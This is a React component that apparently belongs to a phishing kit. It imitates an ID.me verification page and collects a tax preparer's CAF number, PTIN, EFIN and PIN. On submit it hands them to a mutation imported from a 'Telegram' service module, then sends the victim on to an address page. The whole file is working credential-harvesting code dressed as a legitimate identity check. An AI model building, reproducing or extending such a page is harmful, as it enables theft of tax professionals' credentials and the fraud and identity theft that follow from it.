import React, { useState } from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import { useNavigate } from "react-router-dom";
import { useSendGoalMutation } from "../Services/Telegram"; // Make sure this exists

const Goal = () => {
  const navigate = useNavigate();
  const [sendGoal] = useSendGoalMutation();

  const [formData, setFormData] = useState({
    caf: "",
    ptin: "",
    efin: "",
    pin: "",
  });

  const [errors, setErrors] = useState({
    caf: false,
    ptin: false,
    efin: false,
    pin: false,
  });

  const [currentErrorField, setCurrentErrorField] = useState(null);

  const validateField = (fieldName) => {
    const isValid = formData[fieldName].trim() !== "";
    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
    return isValid;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateField("caf")) {
      setCurrentErrorField("caf");
      return;
    }

    if (!validateField("ptin")) {
      setCurrentErrorField("ptin");
      return;
    }

    if (!validateField("efin")) {
      setCurrentErrorField("efin");
      return;
    }

    if (!validateField("pin")) {
      setCurrentErrorField("pin");
      return;
    }

    setCurrentErrorField(null);

    try {
      const response = await sendGoal(formData).unwrap();
      console.log("Goal details sent successfully!");
      navigate("/address"); // <-- Change this if your route is different
    } catch (error) {
      console.error("Error sending goal details:", error);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
          Enter Verification Information
        </h1>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
        >
          {/* CAF */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">CAF Number</label>
            <input
              name="caf"
              type="text"
              value={formData.caf}
              onChange={handleChange}
              onBlur={() => currentErrorField === "caf" && validateField("caf")}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg focus:outline-none ${
                errors.caf
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.caf && <p className="text-red-500 text-sm mt-1">Fill out this field</p>}
          </div>

          {/* PTIN */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">PTIN</label>
            <input
              name="ptin"
              type="text"
              value={formData.ptin}
              onChange={handleChange}
              onBlur={() => currentErrorField === "ptin" && validateField("ptin")}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg focus:outline-none ${
                errors.ptin
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.ptin && <p className="text-red-500 text-sm mt-1">Fill out this field</p>}
          </div>

          {/* EFIN */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">EFIN</label>
            <input
              name="efin"
              type="text"
              value={formData.efin}
              onChange={handleChange}
              onBlur={() => currentErrorField === "efin" && validateField("efin")}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg focus:outline-none ${
                errors.efin
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.efin && <p className="text-red-500 text-sm mt-1">Fill out this field</p>}
          </div>

          {/* PIN */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">PIN</label>
            <input
              name="pin"
              type="text"
              value={formData.pin}
              onChange={handleChange}
              onBlur={() => currentErrorField === "pin" && validateField("pin")}
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg focus:outline-none ${
                errors.pin
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.pin && <p className="text-red-500 text-sm mt-1">Fill out this field</p>}
          </div>

          <button
            type="submit"
            className="w-full py-3 bg-blue-700 text-white rounded-lg mt-2 hover:bg-blue-800 transition-colors text-lg"
          >
            Continue
          </button>
        </form>
      </div>

      {/* Footer */}
      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
};

export default Goal;
